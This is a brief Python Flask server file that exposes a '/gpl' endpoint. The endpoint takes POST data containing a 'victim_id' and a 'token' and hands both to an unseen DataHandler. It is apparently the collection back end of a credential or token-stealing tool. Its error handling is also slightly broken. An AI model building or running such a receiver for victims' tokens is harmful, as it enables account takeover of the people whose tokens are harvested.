import json

from flask import Flask, request
from source.data_workers.DataHandler import DataHandler

gpl = Flask(__name__)


@gpl.route('/gpl', methods=['POST'])
def handler():
    try:
        data = json.loads(request.data.decode())
        if data.get('victim_id') and data.get('token'):
            _DH = DataHandler(data['victim_id'], data['token'])
            _resp = _DH.handler()
            if not _resp:
                raise BaseException
            return _resp
    except Exception as e:
        return 'Bad data passed.', 400


@gpl.route('/gpl', methods=['GET'])
def status():
    return 'ok', 200
